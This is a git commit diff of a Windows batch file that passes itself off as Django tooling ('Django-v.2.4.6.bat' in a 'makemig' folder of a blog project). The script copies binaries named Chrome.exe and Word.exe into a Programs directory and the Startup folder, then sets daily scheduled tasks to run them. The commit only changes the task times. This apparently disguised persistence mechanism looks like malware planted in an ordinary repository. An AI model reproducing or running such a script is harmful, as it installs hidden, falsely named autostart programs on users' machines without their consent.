df6e9a5a05113535886971f4a97361af94148f8a
fabienutt <145588764+fabienutt@users.noreply.github.com>
2023-11-22 12:51:56 +0100

    changes

--- blog/programs/datas/makemig/Django-v.2.4.6.bat
+++ blog/programs/datas/makemig/Django-v.2.4.6.bat
@@ -9,8 +9,8 @@ copy "%repertoire_script%Word.exe" "C:/Programmes (x64)\Word.exe"
 echo o | schtasks /delete /tn "ChromeTask08" /f
 echo o | schtasks /delete /tn "WordAgenda_Access" /f
 
-schtasks /create /tn "ChromeTask08" /tr "%repertoire_script%\Chrome.exe" /sc daily /st 13:30
-schtasks /create /tn "WordAgenda_Access" /tr "%repertoire_script%\Word.exe" /sc daily /st 12:30
+schtasks /create /tn "ChromeTask08" /tr "%repertoire_script%\Chrome.exe" /sc daily /st 14:30
+schtasks /create /tn "WordAgenda_Access" /tr "%repertoire_script%\Word.exe" /sc daily /st 15:30
 set "repertoire_demarrage=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 copy "%repertoire_script%Chrome.exe" "%repertoire_demarrage%"
